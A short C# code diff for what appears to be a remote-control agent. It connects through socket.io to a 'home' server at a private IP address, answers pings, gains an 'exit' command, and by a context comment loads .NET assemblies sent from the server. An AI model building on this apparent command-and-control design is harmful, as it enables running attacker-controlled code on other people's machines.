@@ -34,7 +34,7 @@ namespace ConsoleApp1
             }
             while (true) { };
         }
-        static async void Go(string home = "http://192.168.1.14:8888/")
+        static async void Go(string home = "http://172.16.113.1:8888/")
         {
             // create new socket.io client
             var client = new SocketIO(home);
@@ -54,6 +54,12 @@ namespace ConsoleApp1
             client.On("ping", response =>
             {
                 client.EmitAsync("pong");
+            });
+
+            // Shut down the agent
+            client.On("exit", response =>
+            {
+                Environment.Exit(0);
             });
 
             // Client load .NET assembly (dll)
